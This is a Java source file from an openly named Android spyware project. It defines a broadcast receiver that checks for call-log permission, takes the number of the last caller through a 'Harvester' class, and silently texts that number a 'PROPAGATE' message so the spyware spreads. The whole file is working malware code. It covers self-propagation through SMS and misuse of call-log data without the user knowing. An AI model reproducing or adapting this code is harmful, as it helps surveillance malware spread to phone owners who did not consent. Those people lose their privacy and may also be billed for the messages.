package android.spyware.receivers;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.spyware.utils.Harvester;
import android.support.v4.content.ContextCompat;
import android.telephony.SmsManager;
import android.util.Log;

import static android.spyware.Spyware.DEV_MODE;
import static android.spyware.Spyware.PROPAGATE;
import static android.spyware.Spyware.TAG;

/**
 * Copyright (C) 2015 Alexandre Teyar
 * <p>
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * <p>
 * http://www.apache.org/licenses/LICENSE-2.0
 * <p>
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 **/

public class SendSMSR extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (ContextCompat.checkSelfPermission(context, "android.permission.READ_CALL_LOG") != 0) {
            Log.wtf("::trace", SendSMSR.class.getName() + "->onReceive:insufficient permission");
        } else {
            Harvester harvester = new Harvester(context);

            String lastCallerNumber = harvester.getLastCallerNumber();

            if (lastCallerNumber != null) {
                this.sendSMS(context, lastCallerNumber, PROPAGATE);
            }
        }
    }

    private void sendSMS(Context context, String number, String message) {
        PendingIntent pIntent    = PendingIntent.getActivity(context, 0, new Intent(), 0);
        SmsManager    SMSManager = SmsManager.getDefault();

        SMSManager.sendTextMessage(number, null, message, pIntent, null);

        if (DEV_MODE) {
            Log.i(TAG, SendSMSR.class.getName() + "->sendSMS:" + number + " - " + message);
        }
    }
}
